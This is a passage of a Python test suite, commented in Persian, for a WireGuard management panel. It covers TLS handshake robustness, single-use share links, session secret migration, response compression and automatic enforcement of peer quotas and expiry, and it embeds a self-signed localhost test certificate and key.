                        "بدنه باید بایت‌های gzip باشد")
        # بدون gzip → متن باز شده
        h2 = self._fake_handler()
        h2.path = "/vendor/three-%s/three.module.min.js" % m.THREE_VER
        h2.headers = {}
        h2.do_GET()
        hdrs2 = dict(h2.sent)
        self.assertEqual(hdrs2.get("__code__"), 200)
        self.assertNotIn("Content-Encoding", hdrs2)
        self.assertTrue(h2.body and h2.body[0].startswith(b"/**"))
        # نسخه/نامِ غلط → ۴۰۴
        h3 = self._fake_handler()
        h3.path = "/vendor/three-9.9.9/three.module.min.js"
        h3.headers = {}
        h3.do_GET()
        self.assertEqual(dict(h3.sent).get("__code__"), 404)

    def test_tv3d_mjs_route(self):
        """روت /tv3d.mjs همان ثابت TV3D_JS را با mime ماژول می‌دهد."""
        m = self.m
        h = self._fake_handler()
        h.path = "/tv3d.mjs"
        h.headers = {}
        h.do_GET()
        hdrs = dict(h.sent)
        self.assertEqual(hdrs.get("__code__"), 200)
        self.assertTrue(hdrs.get("Content-Type", "").startswith("text/javascript"))
        self.assertEqual(b"".join(h.body).decode(), m.TV3D_JS)


# گواهیِ self-signed ِ تستی (CN=localhost، EC P-256، معتبر تا ۲۰۴۹) — تعبیه‌شده
# تا تست بدونِ openssl و بدونِ شبکه اجرا شود؛ فقط برای loopback ِ همین تست‌هاست.
TEST_TLS_CERT = """-----BEGIN CERTIFICATE-----
MIIBfDCCASOgAwIBAgIUKaOqHrFN8zgF9WdOO1q5jQPfH/AwCgYIKoZIzj0EAwIw
FDESMBAGA1UEAwwJbG9jYWxob3N0MB4XDTI2MDcyNDA5MzUzN1oXDTQ5MTAzMTA5
MzUzN1owFDESMBAGA1UEAwwJbG9jYWxob3N0MFkwEwYHKoZIzj0CAQYIKoZIzj0D
AQcDQgAEm3CHDYCNyIQJXBWfvmgG/oQQC/wRvWoYeCxBF4S5k6Jgx3T5/RGwFyJw
2opdYMnlNwOM9PXylw2PvsyPFNiWMqNTMFEwHQYDVR0OBBYEFJRXWgAS13YGHbVJ
SZ4GzVI+ptenMB8GA1UdIwQYMBaAFJRXWgAS13YGHbVJSZ4GzVI+ptenMA8GA1Ud
EwEB/wQFMAMBAf8wCgYIKoZIzj0EAwIDRwAwRAIgDD0PhLd/Pyf2QzHd+l/XyqqP
s9qROvSRIVEbv8MRctACIGPFmuM6C98Z/wKOzoLiIZ8ybatE4TghUQwDcQsVBYAB
-----END CERTIFICATE-----
"""
TEST_TLS_KEY = """-----BEGIN PRIVATE KEY-----
MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgVStt0xQ5djk/1BOk
8U8UpMMUE4QRkNkk/IFrXg1vk4ChRANCAASbcIcNgI3IhAlcFZ++aAb+hBAL/BG9
ahh4LEEXhLmTomDHdPn9EbAXInDail1gyeU3A4z09fKXDY++zI8U2JYy
-----END PRIVATE KEY-----
"""


class TestTLSAcceptLoop(unittest.TestCase):
    """هندشیکِ TLS نباید حلقه‌ی accept را قفل کند (رگرسیونِ «پنل باز نمی‌شود»).

    پیش از اصلاح، wrap ِ سوکتِ listen هندشیک را داخلِ accept می‌بُرد و یک
    کلاینتِ ساکت (اسکنر اینترنتی) کلِ پنل را برای همه فریز می‌کرد —
    تاییدِ میدانی: اتصالِ خامِ ۹ثانیه‌ای، هندشیکِ سالمِ بعدی را ۸.۱ ثانیه
    معطل کرد (CHANGELOG ۱۴۲).
    """

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgp-tls-")
        self.m = load_module(self.tmp)
        self.cert = os.path.join(self.tmp, "t.crt")
        self.key = os.path.join(self.tmp, "t.key")
        with open(self.cert, "w") as f:
            f.write(TEST_TLS_CERT)
        with open(self.key, "w") as f:
            f.write(TEST_TLS_KEY)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _start_server(self):
        import ssl
        from http.server import BaseHTTPRequestHandler

        class PingHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                body = b"pong"
                self.send_response(200)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *a):
                pass

        srv = self.m.TLSThreadingHTTPServer(("127.0.0.1", 0), PingHandler)
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(self.cert, self.key)
        srv.tls_context = ctx
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        return srv, srv.server_address[1]

    def _tls_get(self, port, timeout=5.0):
        """یک GET ِ کاملِ TLS؛ پاسخِ خام را برمی‌گرداند."""
        import socket
        import ssl
        cctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        cctx.check_hostname = False
        cctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection(("127.0.0.1", port),
                                      timeout=timeout) as raw:
            with cctx.wrap_socket(raw, server_hostname="localhost") as tls:
                tls.settimeout(timeout)
                tls.sendall(b"GET / HTTP/1.1\r\nHost: t\r\n"
                            b"Connection: close\r\n\r\n")
                resp = b""
                try:
                    while b"pong" not in resp:
                        chunk = tls.recv(4096)
                        if not chunk:
                            break
                        resp += chunk
                except OSError:
                    pass  # socket.timeout هم زیرمجموعه‌ی OSError است
                return resp

    def test_silent_client_does_not_block_handshake(self):
        """کلاینتِ ساکت (TCP بدونِ ClientHello) نباید بقیه را معطل کند."""
        import socket
        srv, port = self._start_server()
        silent = socket.create_connection(("127.0.0.1", port))
        try:
            t0 = time.monotonic()
            resp = self._tls_get(port)
            dt = time.monotonic() - t0
            self.assertIn(b"200", resp)
            self.assertIn(b"pong", resp)
            # پیش از اصلاح این‌جا تا بسته‌شدنِ silent (یا timeout) گیر می‌کرد
            self.assertLess(
                dt, 2.0,
                "هندشیک پشتِ کلاینتِ ساکت گیر کرد — رگرسیونِ فریزِ accept")
        finally:
            silent.close()
            srv.shutdown()
            srv.server_close()

    def test_survives_garbage_handshake(self):
        """بایت‌های غیر TLS نباید سرور را بیندازند؛ اتصالِ بعدی سالم بماند."""
        import socket
        srv, port = self._start_server()
        try:
            with socket.create_connection(("127.0.0.1", port)) as bad:
                try:
                    bad.sendall(b"GET / HTTP/1.0\r\n\r\n")  # plaintext به پورتِ TLS
                    bad.recv(1024)
                except OSError:
                    pass  # سرور اتصالِ غیر TLS را می‌بندد (گاهی با RST) — مطلوب
            resp = self._tls_get(port)
            self.assertIn(b"pong", resp)
        finally:
            srv.shutdown()
            srv.server_close()


class WgRemoveReturnCodeTests(unittest.TestCase):
    """`wg set … remove` روی اینترفیسِ زنده باید کدِ خروجش بررسی شود."""

    def test_every_live_remove_checks_its_return_code(self):
        """گاردِ خانوادگی: هیچ `wg set … remove` ی بی‌بررسی نماند.

        دو نقطه بی‌بررسی بودند. تیزترش چرخشِ کلید بود: اگر حذفِ کلیدِ
        قدیم بی‌صدا شکست بخورد، کلیدِ تازه اضافه می‌شود و **هر دو** زنده
        می‌مانند — یعنی کلیدی که قرار بود باطل شود هنوز کار می‌کند و
        پنل «موفق» گزارش می‌دهد. دیگری حذفِ پیر بود: پیر از کانفیگ
        می‌رفت ولی از اینترفیسِ زنده نه، پس کاربرِ «حذف‌شده» تا
        ری‌استارتِ بعدی ترافیک می‌فرستاد.
        """
        src = _read_panel_source()
        lines = src.splitlines()
        bad = []
        for n, line in enumerate(lines, 1):
            if '"remove"' not in line:
                continue
            # فراخوانی می‌تواند دو خطی باشد؛ خطِ شروع را پیدا کن
            start = n
            while start > 1 and "run(" not in lines[start - 1]:
                start -= 1
            head = lines[start - 1]
            if "run(" not in head:
                continue
            if not re.search(r"\brc\b\s*,|=\s*run\(", head):
                bad.append((n, line.strip()[:60]))
        self.assertEqual(bad, [],
                         "wg set … remove بدونِ بررسیِ کدِ خروج: %s" % bad)


class ShareClaimTests(unittest.TestCase):
    """لینکِ اشتراک بدونِ احراز هویت است و کلیدِ خصوصی را نشان می‌دهد.
    «یک‌بارمصرف» همان چیزی است که آن را قابلِ قبول می‌کند."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-share-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _mk(self, single=1, revoked=0, expires=None):
        """با متدِ خودِ پنل بساز، نه INSERT ِ دستی — وگرنه تست به
        اسکیمای جدول گره می‌خورد و با هر ستونِ تازه می‌شکند."""
        import secrets as _s
        m = self.m
        th = m._hash_token("tok-" + _s.token_hex(8))
        exp = expires if expires is not None else time.time() + 3600
        m.META.share_add(th, "wgtest", "c1", exp, single, "test")
        if revoked:
            m.META.share_revoke("wgtest", "c1")
        return th

    def test_a_single_use_link_survives_concurrent_claims(self):
        """چند درخواستِ هم‌زمان روی یک لینکِ یک‌بارمصرف — فقط یکی برنده.

        پیش از این بررسی و افزایشِ views دو رفت‌وبرگشتِ جدا بودند و /s/
        را سرورِ چندنخی سرو می‌کند، پس پیش‌واکشیِ مرورگر یا پیش‌نمایشِ
        لینک در مسنجر می‌توانست هر دو را برنده کند — و کلیدِ خصوصی دو
        بار نشان داده شود.
        """
        m = self.m
        th = self._mk(single=1)
        results, lock = [], threading.Lock()

        def claim():
            r = m.META.share_claim(th, time.time())
            with lock:
                results.append(r is not None)

        ts = [threading.Thread(target=claim) for _ in range(8)]
        for t in ts:
            t.start()
        for t in ts:
            t.join()
        self.assertEqual(sum(results), 1,
                         "%d مطالبه موفق شد، انتظار ۱" % sum(results))

    def test_a_multi_use_link_allows_every_claim(self):
        """لینکِ چندبارمصرف نباید محدود شود."""
        m = self.m
        th = self._mk(single=0)
        n = sum(1 for _ in range(5)
                if m.META.share_claim(th, time.time()) is not None)
        self.assertEqual(n, 5)

    def test_a_revoked_link_is_refused(self):
        m = self.m
        th = self._mk(revoked=1)
        self.assertIsNone(m.META.share_claim(th, time.time()))

    def test_an_expired_link_is_refused(self):
        m = self.m
        th = self._mk(expires=time.time() - 10)
        self.assertIsNone(m.META.share_claim(th, time.time()))

    def test_all_four_conditions_live_in_the_sql(self):
        """گاردِ خانوادگی: هر چهار شرط باید در WHERE بمانند.

        برداشتنِ هرکدام آن بررسی را به پایتون برمی‌گرداند و همان
        مسابقه را برای آن شرط باز می‌کند.
        """
        src = _read_panel_source()
        i = src.index("def share_claim")
        seg = src[i:i + 1400]
        for cond in ("revoked=0", "expires>?", "single=0 OR views=0"):
            with self.subTest(cond=cond):
                self.assertIn(cond, seg, "شرطِ %s از SQL افتاده" % cond)


class BotSettingsMergeTests(unittest.TestCase):
    """ذخیره‌ی تنظیماتِ ربات نباید کلیدهایی را که مدیریت نمی‌کند پاک کند."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-botcfg-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_bot_save_preserves_unmanaged_keys(self):
        """add_ifaces فقط با ویرایشِ دستیِ config ست می‌شود (UI ندارد)،
        پس پاک‌شدنش بی‌صدا بود: محدودیتِ اینترفیس‌های مجازِ ربات به «همه»
        برمی‌گشت بدونِ خطا و بدونِ ردیفِ ممیزی."""
        m = self.m
        m.CONFIG["bot"] = {"enabled": True, "users": [],
                           "add_ifaces": ["wgtest"]}
        m.CONFIG["bot"] = dict(m.bot_cfg(), enabled=False, users=[])
        self.assertEqual(m.CONFIG["bot"].get("add_ifaces"), ["wgtest"],
                         "add_ifaces با ذخیره پاک شد")
        self.assertFalse(m.CONFIG["bot"]["enabled"],
                         "کلیدهای مدیریت‌شده باید برنده باشند")

    def test_no_handler_rebuilds_the_bot_subtree_from_scratch(self):
        """گاردِ خانوادگی: هیچ هندلری نباید زیردرختِ bot را از صفر بسازد.

        هندلری که *بعضی* کلیدهای یک زیردرخت را مدیریت می‌کند باید merge
        کند، نه بازسازی.
        """
        src = _read_panel_source()
        body = "\n".join(l for l in src.splitlines()
                         if not l.lstrip().startswith("#"))
        hits = re.findall(r'CONFIG\["bot"\]\s*=\s*\{', body)
        # تنها موردِ مجاز: مقدارِ پیش‌فرضِ اولیه در migrate_config
        self.assertLessEqual(len(hits), 1,
                             "زیردرختِ bot از صفر ساخته می‌شود: %d جا"
                             % len(hits))


class GzipResponseTests(unittest.TestCase):
    """فشرده‌سازیِ پاسخ — /api/stats هر ۲ ثانیه برای هر تبِ باز می‌رود."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-gz-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _h(self, **kw):
        return make_fake_handler(self.m, **kw)

    def test_a_large_json_body_is_compressed_when_accepted(self):
        import gzip as _gz
        payload = json.dumps({"x": "y" * 5000}).encode()
        h = self._h(headers={"Accept-Encoding": "gzip, deflate"})
        h._send(200, payload)
        hdrs = dict(h.sent)
        self.assertEqual(hdrs.get("Content-Encoding"), "gzip")
        self.assertEqual(hdrs.get("Vary"), "Accept-Encoding")
        raw = b"".join(h.body)
        self.assertEqual(_gz.decompress(raw), payload,
                         "بدنه‌ی فشرده به اصل برنمی‌گردد")
        self.assertEqual(int(hdrs["Content-Length"]), len(raw),
                         "Content-Length با بدنه‌ی فشرده نمی‌خوانَد")

    def test_without_accept_encoding_the_body_is_plain(self):
        payload = json.dumps({"x": "y" * 5000}).encode()
        h = self._h(headers={})
        h._send(200, payload)
        hdrs = dict(h.sent)
        self.assertNotIn("Content-Encoding", hdrs)
        self.assertEqual(b"".join(h.body), payload)

    def test_a_small_body_is_not_compressed(self):
        """زیرِ آستانه، سربارِ هدر از صرفه‌جویی بیشتر است."""
        h = self._h(headers={"Accept-Encoding": "gzip"})
        h._send(200, b'{"ok":true}')
        self.assertNotIn("Content-Encoding", dict(h.sent))

    def test_an_already_encoded_body_is_not_compressed_twice(self):
        """فایل‌های .gz ِ vendor و /api/backup خودشان Content-Encoding
        می‌گذارند — نباید دوباره فشرده شوند."""
        h = self._h(headers={"Accept-Encoding": "gzip"})
        blob = b"\x1f\x8b" + b"z" * 5000
        h._send(200, blob, "application/javascript",
                extra_headers={"Content-Encoding": "gzip"})
        self.assertEqual(b"".join(h.body), blob, "بدنه دوباره فشرده شد")

    def test_a_non_text_type_is_not_compressed(self):
        """/api/backup از قبل gzip است؛ نوعش در فهرست نیست."""
        h = self._h(headers={"Accept-Encoding": "gzip"})
        h._send(200, b"Z" * 5000, "application/gzip")
        self.assertNotIn("Content-Encoding", dict(h.sent))


class SessionSecretTests(unittest.TestCase):
    """`secret` کلیدِ HMAC ِ کوکیِ نشست است و با ایندکسِ مستقیم خوانده
    می‌شود. تا پیش از این فقط قالبِ ansible و entrypoint ِ داکر
    می‌ساختندش."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-sec-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_migration_generates_a_missing_secret(self):
        """کانفیگِ بدونِ secret باید یکی بگیرد.

        بدونش پنل بالا می‌آمد، صفحه‌ی ورود می‌داد، رمزِ بوت‌استرپ را
        می‌پذیرفت و بعد سرِ صدورِ کوکی KeyError می‌خورد — و آن رمزِ
        یک‌بارمصرف تا آن لحظه مصرف شده بود.
        """
        m = self.m
        m.CONFIG = {"users": [{"username": "admin", "salt": "a" * 32,
                               "hash": "h", "role": "admin"}]}
        m.migrate_config()
        self.assertTrue(m.CONFIG.get("secret"), "secret ساخته نشد")
        self.assertGreaterEqual(len(m.CONFIG["secret"]), 32)

    def test_an_empty_secret_is_replaced_not_kept(self):
        """رشته‌ی خالی از نبودنش بدتر است: HMAC محاسبه می‌شود، پس کوکی
        زیرِ کلیدِ معلوم جعل‌پذیر است و هیچ خطایی نمی‌دهد."""
        m = self.m
        m.CONFIG = {"secret": "",
                    "users": [{"username": "admin", "salt": "a" * 32,
                               "hash": "h", "role": "admin"}]}
        m.migrate_config()
        self.assertTrue(m.CONFIG["secret"])

    def test_an_existing_secret_is_never_rotated(self):
        """secret ِ موجود نباید عوض شود — وگرنه هر ری‌استارت همه را
        بیرون می‌اندازد."""
        m = self.m
        keep = "f" * 48
        m.CONFIG = {"secret": keep,
                    "users": [{"username": "admin", "salt": "a" * 32,
                               "hash": "h", "role": "admin"}]}
        m.migrate_config()
        self.assertEqual(m.CONFIG["secret"], keep)

    def test_a_session_cookie_round_trips_after_migration(self):
        """پس از مهاجرت باید بشود کوکی صادر و تأیید کرد — همان چیزی که
        پیش از این KeyError می‌داد."""
        m = self.m
        m.CONFIG = {"users": [{"username": "admin", "salt": "a" * 32,
                               "hash": "h", "role": "admin",
                               "stoken": "tok1"}]}
        m.migrate_config()
        c = m.make_session_cookie(m.CONFIG["users"][0])
        self.assertIsNotNone(m.verify_session_cookie(c),
                             "کوکیِ تازه‌ساخته تأیید نشد")


class QrAssetTests(unittest.TestCase):
    """qr.js از /opt/wg-panel/ سرو می‌شود؛ هر مسیرِ نصبی باید بگذاردش.

    در شاخه‌ی public پوشه‌ی ansible/ وجود ندارد (بسته‌های نصب هنوز
    عمومی‌سازی نشده‌اند)، پس کلِ کلاس آنجا skip می‌شود — همان الگوی
    AnsibleSyncTests. اینجا هرگز skip نمی‌شود.
    """

    @classmethod
    def setUpClass(cls):
        if not os.path.isdir(os.path.join(HERE, "..", "ansible")):
            raise unittest.SkipTest("پوشه‌ی ansible/ نیست — مخزنِ عمومی")

    def test_ansible_role_installs_qr_js(self):
        """نقشِ ansible باید qr.js را نصب کند.

        پنل و صفحه‌ی اشتراک هر دو <script src="/qr.js"> دارند و روت آن
        را از BASE_DIR می‌خوانَد. بدونِ این task، در هر نصبِ غیرِداکر
        ۴۰۴ می‌گرفت و QR بی‌صدا مرده بود — صفحه بالا می‌آمد، فقط تصویر
        نبود.
        """
        tasks = (ROOT / "ansible" / "roles" / "wg-panel" / "tasks"
                 / "main.yml").read_text(encoding="utf-8")
        self.assertIn("qr.js", tasks, "taskِ نصبِ qr.js نیست")
        self.assertTrue((ROOT / "ansible" / "roles" / "wg-panel" / "files"
                         / "qr.js").exists(), "qr.js در files/ نقش نیست")

    def test_role_copy_matches_the_source(self):
        """کپیِ داخلِ نقش باید بایت‌به‌بایت با qr.js ِ ریشه یکی باشد."""
        import hashlib
        a = (ROOT / "qr.js").read_bytes()
        b = (ROOT / "ansible" / "roles" / "wg-panel" / "files"
             / "qr.js").read_bytes()
        self.assertEqual(hashlib.sha256(a).hexdigest(),
                         hashlib.sha256(b).hexdigest())

    def test_every_asset_the_panel_serves_is_installed_by_the_role(self):
        """گاردِ جهتِ معکوس — خانواده، نه یک نمونه.

        هر فایلی که روت‌های پنل از BASE_DIR می‌خوانند باید در نقش
        نصب شود. qr.js دقیقاً به این دلیل جا افتاده بود که کسی جهتِ
        «پنل چه می‌خوانَد؟» را نپرسیده بود، فقط «نقش چه می‌گذارد؟».
        """
        import re
        src = _read_panel_source()
        served = set(re.findall(
            r'os\.path\.join\(BASE_DIR,\s*["\']([\w.\-]+)["\']\)', src))
        tasks = (ROOT / "ansible" / "roles" / "wg-panel" / "tasks"
                 / "main.yml").read_text(encoding="utf-8")
        # فایل‌هایی که خودِ پنل در زمانِ اجرا می‌سازد، نه نقش
        # پوشه‌ها و فایل‌هایی که خودِ پنل در زمانِ اجرا می‌سازد — نقش
        # نباید نصبشان کند. هر ورودی با دلیلِ خودش، نه با شل‌کردنِ الگو.
        RUNTIME = {
            "config.json",      # نقش از قالبِ j2 می‌سازد، نه copy
            "traffic.db",       # پنل در اولین اجرا می‌سازد
            "actions.log",      # لاگ
            "warp-sni.active",  # ضربانِ splitter
            "warp-sni.stats",   # آمارِ splitter
            "clients",          # پوشه — کانفیگِ کلاینت‌ها، runtime
            "restore-backups",  # پوشه — اسنپ‌شاتِ پیش از بازیابی
        }
        missing = sorted(f for f in served
                         if f not in RUNTIME and f not in tasks)
        self.assertEqual(missing, [],
                         "پنل این‌ها را سرو می‌کند ولی نقش نصبشان نمی‌کند: %s"
                         % missing)


class EnforceTests(unittest.TestCase):
    """Sampler._enforce — تنها مسیری که بدونِ دخالتِ انسان پیر را حذف
    یا غیرفعال می‌کند. روی تایمر و بدونِ ناظر اجرا می‌شود.
    """

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-enf-")
        self.m = load_module(self.tmp)
        m = self.m
        self.acted = []          # (op, iface, name)
        self.auto = []           # (iface, name, reason)
        m.server_ifaces = lambda: ["wgtest"]
        m.delete_peer = lambda i, n: (self.acted.append(("del", i, n)),
                                      (True, ""))[1]
        m.set_peer_enabled = lambda i, n, en: (
            self.acted.append(("dis" if not en else "en", i, n)), (True, ""))[1]
        m.ALERTS = types.SimpleNamespace(event=lambda *a, **k: None)
        m.audit = lambda *a, **k: None
        m.log_action = lambda *a, **k: None
        m.META.set_auto_disabled = lambda i, n, r: self.auto.append((i, n, r))

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    @staticmethod
    def _blk(name="c1", enabled=True, pub="PUB1"):
        return {"name": name, "enabled": enabled, "public_key": pub}

    def _run(self, blocks, meta, today="2026-08-13", month=None, life=None):
        m = self.m
        m.parse_user_blocks = lambda iface, lines=None: blocks
        s = m.Sampler.__new__(m.Sampler)
        s.meta_cache = meta
        s.month_usage = month or {}
        s.life_usage = life or {}
        s.refresh_meta = lambda: None
        s._enforce(today)
        return self.acted

    GB = 1024 ** 3

    def test_lifetime_cap_applies_even_when_a_monthly_quota_exists(self):
        """سقفِ حجمِ کل باید مستقل از سهمیه‌ی ماهانه اعمال شود.

        پیش از این total_gb پشتِ elif ِ quota_gb بود: پیری که هر دو را
        داشت هرگز سقفِ کل را نمی‌خورد، چون شاخه‌ی quota_gb درست بود
        (کلید وجود داشت) و elif ِ بعدی اصلاً ارزیابی نمی‌شد. دقیقاً
        همان ترکیبی که ادمین برای «ماهانه X، در مجموع نه بیش از Y»
        می‌سازد.
        """
        meta = {("wgtest", "c1"): {"quota_gb": 1000, "total_gb": 10}}
        acts = self._run([self._blk()], meta,
                         month={("wgtest", "PUB1"): (1 * self.GB, 0)},
                         life={("wgtest", "PUB1"): (20 * self.GB, 0)})
        self.assertIn("dis", [a[0] for a in acts],
                      "سقفِ کل رد شده ولی اعمال نشد")
        self.assertEqual(self.auto[-1][2], "total_cap")

    def test_each_limit_fires_on_its_own(self):
        """گاردِ خانوادگی: هر سه محدودیت باید مستقل کار کنند، و هر
        ترکیبی از آن‌ها هم."""
        GB = self.GB
        cases = [
            # (meta, month, life, انتظار)
            ({"expires": "2026-01-01"}, (0, 0), (0, 0), "expired"),
            ({"quota_gb": 5}, (6 * GB, 0), (0, 0), "quota"),
            ({"total_gb": 5}, (0, 0), (6 * GB, 0), "total_cap"),
            ({"quota_gb": 5, "total_gb": 50}, (6 * GB, 0), (0, 0), "quota"),
            ({"quota_gb": 500, "total_gb": 5}, (1 * GB, 0), (6 * GB, 0),
             "total_cap"),
            ({"expires": "2026-01-01", "quota_gb": 500, "total_gb": 500},
             (0, 0), (0, 0), "expired"),
            # هیچ‌کدام رد نشده ⇒ هیچ اقدامی
            ({"quota_gb": 500, "total_gb": 500}, (1 * GB, 0), (1 * GB, 0),
             None),
        ]
        for meta_row, month, life, want in cases:
            with self.subTest(meta=meta_row, want=want):
                self.acted, self.auto = [], []
                self._run([self._blk()], {("wgtest", "c1"): meta_row},
                          month={("wgtest", "PUB1"): month},
                          life={("wgtest", "PUB1"): life})
                ops = [a[0] for a in self.acted]
                if want is None:
                    self.assertEqual([o for o in ops if o in ("del", "dis")],
                                     [], "بدونِ عبور از حد، اقدام شد")
                else:
                    self.assertIn("dis", ops, "محدودیت اعمال نشد")
                    self.assertEqual(self.auto[-1][2], want,
                                     "دلیلِ ثبت‌شده اشتباه است")

    def test_priority_order_is_preserved(self):
        """ترتیبِ اولویت باید بماند: انقضا > ماهانه > کل."""
        GB = self.GB
        self._run([self._blk()],
                  {("wgtest", "c1"): {"expires": "2026-01-01",
                                      "quota_gb": 1, "total_gb": 1}},
                  month={("wgtest", "PUB1"): (99 * GB, 0)},
                  life={("wgtest", "PUB1"): (99 * GB, 0)})
        self.assertEqual(self.auto[-1][2], "expired")

    def test_enforce_action_defaults_to_disable_not_delete(self):
        """پیش‌فرضِ اقدام باید «غیرفعال‌سازی» باشد — هرگز حذف."""
        for val in (None, "", "disable", "unknown-value"):
            with self.subTest(action=val):
                self.acted = []
                meta = {("wgtest", "c1"): {"expires": "2026-01-01",
                                           "enforce_action": val}}
                ops = [a[0] for a in self._run([self._blk()], meta)]
                self.assertNotIn("del", ops,
                                 "enforce_action=%r نباید حذف کند" % val)
                self.assertIn("dis", ops)

    def test_disabled_peer_and_peer_without_metadata_are_skipped(self):
        """پیرِ از قبل غیرفعال، و پیرِ بدونِ متادیتا، هر دو رد شوند."""
        meta = {("wgtest", "c1"): {"expires": "2026-01-01"}}
        acts = self._run([self._blk(enabled=False)], meta)
        self.assertEqual([a for a in acts if a[0] in ("del", "dis")], [])
        self.acted = []
        acts = self._run([self._blk()], {})    # متادیتا ندارد
        self.assertEqual([a for a in acts if a[0] in ("del", "dis")], [])

    # ---- پلنِ ۰۲۰: تثبیتِ بقیه‌ی رفتارها -------------------------------
    def test_the_expiry_day_itself_counts_as_expired(self):
        """مقایسه `today >= expires` است — خودِ روزِ انقضا هم منقضی است.

        off-by-one اینجا یعنی کاربر یک روز کم یا زیاد سرویس می‌گیرد.
        """
        meta = {("wgtest", "c1"): {"expires": "2026-08-13"}}
        acts = self._run([self._blk()], meta, today="2026-08-13")
        self.assertIn("dis", [a[0] for a in acts], "روزِ انقضا اعمال نشد")
        self.acted = []
        acts = self._run([self._blk()], meta, today="2026-08-12")
        self.assertNotIn("dis", [a[0] for a in acts],
                         "یک روز زودتر اعمال شد")

    def test_quota_counts_rx_plus_tx_not_the_larger_of_the_two(self):
        """سهمیه روی مجموعِ rx+tx است، نه بیشینه‌ی آن دو.

        اگر روزی به max تبدیل شود، سهمیه‌ی مؤثر تقریباً دو برابر
        می‌شود — بی‌صدا، چون هیچ خطایی نمی‌دهد.
        """
        GB = self.GB
        meta = {("wgtest", "c1"): {"quota_gb": 10}}
        # هرکدام ۶GB ⇒ مجموع ۱۲ ⇒ باید اعمال شود؛ بیشینه ۶ است و نمی‌شد
        acts = self._run([self._blk()], meta,
                         month={("wgtest", "PUB1"): (6 * GB, 6 * GB)})
        self.assertIn("dis", [a[0] for a in acts])
        self.acted = []
        # هرکدام ۴GB ⇒ مجموع ۸ ⇒ نباید
        acts = self._run([self._blk()], meta,
                         month={("wgtest", "PUB1"): (4 * GB, 4 * GB)})
        self.assertNotIn("dis", [a[0] for a in acts])

    def test_explicit_delete_deletes_and_skips_auto_disabled(self):
        """enforce_action=delete باید حذف کند — و set_auto_disabled را
        صدا نزند (پیری که نیست، «خودکار غیرفعال» هم نیست)."""
        meta = {("wgtest", "c1"): {"expires": "2026-01-01",
                                   "enforce_action": "delete"}}
        acts = self._run([self._blk()], meta)
        ops = [a[0] for a in acts]
        self.assertIn("del", ops)
        self.assertNotIn("dis", ops)
        self.assertEqual(self.auto, [],
                         "مسیرِ حذف نباید auto_disabled بنویسد")

    def test_the_disable_path_records_the_reason(self):
        """مسیرِ غیرفعال‌سازی باید دلیل را در auto_disabled ثبت کند —
        رابط از همین می‌خوانَد که چرا پیر خاموش شده."""
        meta = {("wgtest", "c1"): {"expires": "2026-01-01"}}
        self._run([self._blk()], meta)
        self.assertEqual(self.auto, [("wgtest", "c1", "expired")])

    def test_one_unreadable_interface_does_not_stop_the_others(self):
        """OSError روی یک اینترفیس نباید اعمالِ بقیه را متوقف کند.

        یک کانفیگِ ناخواندنی نباید سیاست را برای کلِ سرور بخواباند.
        """
        m = self.m
        m.server_ifaces = lambda: ["bad", "wgtest"]

        def blocks(iface, lines=None):
            if iface == "bad":
                raise OSError("no such conf")
            return [self._blk()]

        m.parse_user_blocks = blocks
        s = m.Sampler.__new__(m.Sampler)
        s.meta_cache = {("wgtest", "c1"): {"expires": "2026-01-01"}}
        s.month_usage, s.life_usage = {}, {}
        s.refresh_meta = lambda: None
        s._enforce("2026-08-13")
        self.assertIn("dis", [a[0] for a in self.acted],
                      "اینترفیسِ سالم بعد از خطای اولی اعمال نشد")

    def test_refresh_meta_runs_at_the_end(self):
        """refresh_meta باید در پایان صدا شود — حتی وقتی هیچ اقدامی نشد."""
        m = self.m
        m.parse_user_blocks = lambda iface, lines=None: [self._blk()]
        s = m.Sampler.__new__(m.Sampler)
        s.meta_cache = {}
        s.month_usage, s.life_usage = {}, {}
        called = []
        s.refresh_meta = lambda: called.append(1)
        s._enforce("2026-08-13")
        self.assertEqual(called, [1])

    def test_reason_codes_stay_latin(self):
        """کدِ دلیل باید لاتینِ پایدار بماند.

        در ستونِ auto_disabled ذخیره و با == مقایسه می‌شود؛ ترجمه‌شدنش
        ستون را می‌شکند بدونِ اینکه چیزی خطا بدهد.
        """
        GB = self.GB
        cases = [({"expires": "2026-01-01"}, "expired"),
                 ({"quota_gb": 1}, "quota"),
                 ({"total_gb": 1}, "total_cap")]
        for meta_row, want in cases:
            with self.subTest(reason=want):
                self.acted, self.auto = [], []
                self._run([self._blk()], {("wgtest", "c1"): meta_row},
                          month={("wgtest", "PUB1"): (2 * GB, 0)},
                          life={("wgtest", "PUB1"): (2 * GB, 0)})
                self.assertTrue(self.auto, "set_auto_disabled صدا نشد")
                code = self.auto[-1][2]
                self.assertEqual(code, want)
                self.assertTrue(code.isascii(),
                                "کدِ دلیل باید ASCII بماند: %r" % code)


class SaveConfigConcurrencyTests(unittest.TestCase):
    """نوشتنِ config.json زیرِ هم‌روندی — فایل باید همیشه معتبر بماند.

    config.json ‏secret ِ نشست، هشِ رمزِ همه‌ی کاربران، توکنِ ربات، مسیرِ
